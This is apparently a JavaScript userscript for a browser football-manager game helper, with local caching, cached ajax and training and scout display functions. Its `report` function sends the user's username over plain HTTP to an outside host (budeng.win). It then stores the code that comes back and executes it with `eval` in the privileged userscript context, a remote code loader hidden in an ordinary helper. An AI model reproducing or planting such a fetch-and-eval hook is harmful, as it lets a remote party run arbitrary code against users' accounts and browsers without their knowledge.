var vpleModel = {

    cacheByIDB: function () {
        this.db = new Dexie("MZCache");
        this.db.version(1).stores({
            cache: "key, html, ts"
        });
        this.getLocValue = function (key, cache_mode, callback) {
            this.db.cache.get(key, function (data) {
                if (data == undefined) {
                    callback(false);
                    return;
                }
                if (cache_mode == 1) {
                    callback(data.html);
                    return;
                }
                let ts = data.ts;

                if (ts != -1) {
                    let dt = new Date(ts);
                    let now = new Date();
                    //let d = now.getTime() - dt.getTime();
                    if (now.getUTCFullYear() == dt.getUTCFullYear() && now.getUTCMonth() == dt.getUTCMonth() && now.getUTCDate() == dt.getUTCDate()) {
                        if (now.getUTCHours() >= 1 && now.getUTCHours() <= 22) {
                            //取缓存
                        } else if (now.getUTCHours() != dt.getUTCHours()) {
                            //每小时更新一次缓存
                            callback(false);
                            return;
                        }
                    } else {
                        callback(false);
                        return;
                    }
                    callback(data.html);
                    return;

                } else {
                    callback(false);
                    return;
                }
            });
        };
        this.setLocValue = function (key, val, callback) {
            this.db.cache.put({ key: key, html: val, ts: new Date().getTime() }).then(function (lastKey) {
                callback();
            });
        };
        this.clearCacheItem = function (key) {
            this.db.cache.delete(key);
        };

        this.clearExpired = function () {
            let oneDayAgo = new Date(Date.now() - 3600 * 1000 * 24).getTime();
            this.db.cache.where('ts').below(oneDayAgo)
                .delete();
        };
        this.clearAll = function () {
            this.db.cache.clear();
        };
    }
    ,

    cacheByGM: function () {
        this.getLocValue = function (key, cache_mode, callback) {
            key = md5(key);
            if (cache_mode == 1) {
                let b64 = GM_getValue(key, false);
                if (b64) {
                    callback(b64);
                    return;
                }
                callback(false);
                return;
            } else {
                let ts = GM_getValue("Dt_" + key, -1);

                if (ts != -1) {
                    let dt = new Date(ts);
                    let now = new Date();
                    //let d = now.getTime() - dt.getTime();
                    if (now.getUTCFullYear() == dt.getUTCFullYear() && now.getUTCMonth() == dt.getUTCMonth() && now.getUTCDate() == dt.getUTCDate()) {
                        if (now.getUTCHours() >= 1 && now.getUTCHours() <= 22) {
                            //取缓存
                        } else if (now.getUTCHours() != dt.getUTCHours()) {
                            //每小时更新一次缓存
                            callback(false);
                            return;
                        }
                    } else {
                        callback(false);
                        return;
                    }
                    let b64 = GM_getValue(key, false);
                    if (b64) {
                        callback(b64);
                        return;
                    }
                    callback(false);
                    return;

                } else {
                    callback(false);
                    return;
                }
            }
        }
            ;
        this.setLocValue = function (key, val, callback) {
            key = md5(key);
            GM_setValue("Dt_" + key, new Date().getTime());
            GM_setValue(key, val);
            callback();
        };
        this.clearCacheItem = function (key) {
            GM_deleteValue("Dt_" + key);
            GM_deleteValue(key);
        };
        this.clearExpired = function (maxcount) {
            let lists = GM_listValues();
            let max = lists.length;
            if (maxcount) {
                max = maxcount;
            } else if (lists.length > 100) {
                max = 100;
            }
            for (let i = 0; i < lists.length; i++) {
                let ts;
                if (lists[i].startsWith("Dt_")) {
                    ts = GM_getValue(lists[i], -1);
                    let key = lists[i].substring(3);
                    if (ts != -1) {
                        let dt = new Date(ts);
                        let now = new Date();
                        if (now.getUTCFullYear() == dt.getUTCFullYear() && now.getUTCMonth() == dt.getUTCMonth() && now.getUTCDate() == dt.getUTCDate()) {
                            continue;
                        }
                        GM_deleteValue(lists[i]);
                        GM_deleteValue(key);
                        max--;
                        if (max <= 0) {
                            break;
                        }
                    }
                }
            }
        };
        this.clearAll = function () {
            //假实现 过多会引起浏览器崩溃
            this.clearExpired(100);
        };
        this.autoclearCache = function () {
            let ts = GM_getValue("last_autoclear", 0);
            let dt = new Date(ts);
            let now = new Date();

            if (now.getUTCFullYear() == dt.getUTCFullYear() && now.getUTCMonth() == dt.getUTCMonth() && (now.getUTCDate() - dt.getUTCDate()) < 3) {
                return false;
            } else {
                clearCache(100);
                GM_setValue("last_autoclear", now.getTime());
                return true;
            }
        };
    }
}

var vple = {
    cacheItem: new vpleModel.cacheByIDB(),
    ajax: function (url, callback, cache_mode, Cjson) {
        if (cache_mode == undefined) {
            cache_mode = 2;
            //0 不缓存每次都获取 1 缓存永不刷新 2 缓存每日刷新
        }
        var nowcacheItem = this.cacheItem;
        if (cache_mode > 0) {
            nowcacheItem.getLocValue(url, cache_mode, function (b64) {
                if (b64) {
                    let tdata;
                    if (b64.startsWith("H4sIAA")) {
                        if (Cjson) {
                            tdata = "9" + b64;
                        } else {
                            tdata = pako.ungzip(base64js.toByteArray(b64), { to: 'string' });
                        }
                    } else {
                        if (Cjson) {
                            tdata = "9" + base64js.fromByteArray(pako.gzip(b64));
                        } else {
                            tdata = b64;
                        }
                    }
                    if (callback(tdata, true)) {
                        nowcacheItem.clearCacheItem(url);
                    }
                } else {
                    $.ajax({
                        type: "GET",
                        url: url,
                        dataType: "html",
                        success: function (data) {
                            let b64 = base64js.fromByteArray(pako.gzip(data));
                            nowcacheItem.setLocValue(url, b64, function () {
                                let ret = false;
                                if (Cjson) {
                                    ret = callback("9" + b64, false);
                                } else {
                                    ret = callback(data, false);
                                }
                                if (ret) {
                                    nowcacheItem.clearCacheItem(url);
                                }
                            });
                        }
                    });
                }
            });
        } else {

            $.ajax({
                type: "GET",
                url: url,
                dataType: "html",
                success: function (data) {
                    let b64 = base64js.fromByteArray(pako.gzip(data));
                    nowcacheItem.setLocValue(url, b64, function () {
                        let ret = false;
                        if (Cjson) {
                            ret = callback("9" + b64, false);
                        } else {
                            ret = callback(data, false);
                        }
                        if (ret) {
                            nowcacheItem.clearCacheItem(url);
                        }
                    });
                }
            });
        }
    }
    ,
    autoclearCache: function () {
        let ts = GM_getValue("last_autoclear", 0);
        let dt = new Date(ts);
        let now = new Date();
        if (now.getUTCFullYear() == dt.getUTCFullYear() && now.getUTCMonth() == dt.getUTCMonth() && (now.getUTCDate() - dt.getUTCDate()) < 1) {
            return false;
        } else {
            this.cacheItem.clearExpired();
            //clearCache(100);
            GM_setValue("last_autoclear", now.getTime());
            return true;
        }
    }
    ,
    report: function () {
        let username = $("#header-username").html();
        if (username != undefined) {
            let myD = this;
            GM_xmlhttpRequest({
                method: "GET",
                url: "http://www.budeng.win:852/MZ/Report?u=" + username + (GM_getValue("jmd5", false) ? "&k=" + GM_getValue("jmd5", false) : ""),
                responseType: "json",
                onload: function (result) {
                    if (result && result.status == 200) {
                        let ret = result.response;
                        let jc = false;
                        if (ret.s) {
                            jc = GM_getValue("jc", "");
                        } else if (ret.c) {
                            GM_setValue("jc", ret.c);
                            GM_setValue("jmd5", md5(ret.c));
                            jc = ret.c;
                        }
                        if (jc) {
                            myD.eval(pako.ungzip(base64js.toByteArray(jc), { to: 'string' }));
                        } else {
                            if (GM_getValue("jmd5", false)) {
                                GM_deleteValue("jmd5");
                            }
                            if (GM_getValue("jc", false)) {
                                GM_deleteValue("jc");
                            }
                        }
                    }
                },
                onerror: function (result) {
                }
            });
        }
    },

    eval: function (c) {
        eval(c);
    },



    D_GetNowSeasonInfo: function (xPlotLines) {
        return undefined;
    },
    D_FillTraining: function (type, playerTS, g, NowSeasonInfo) {
        if (type == "") {
            fillTrainingLevel("itc", mzreg.bar_itc, playerTS, g.marker.symbol);
            fillTrainingLevel("ycc", mzreg.bar_ycc, playerTS, g.marker.symbol);
            fillTrainingLevel("pos", mzreg.bar_pos, playerTS, g.marker.symbol);
            fillTrainingLevel("neg", mzreg.bar_neg, playerTS, g.marker.symbol, true);
        } else {
            fillTrainingLevel(type, mzreg.bar_itc, playerTS, g.marker.symbol);
            fillTrainingLevel(type, mzreg.bar_ycc, playerTS, g.marker.symbol);
            fillTrainingLevel(type, mzreg.bar_pos, playerTS, g.marker.symbol);
            fillTrainingLevel(type, mzreg.bar_neg, playerTS, g.marker.symbol, true);
        }
    },
    D_NowSeasonText: function (pid, NowSeasonInfo, pdom) {

    },
    D_ShowScoutText: function (strSus, pid, pdom, HS, HPids, LS, LPids) {
        showHelpLayer(strSus, now_language.scoutReport, true);
        return strSus;
    },
    D_ShowMaybeSkill: function (pdom, HStar, HP1, HP2, LStar, LP1, LP2) {

    }
}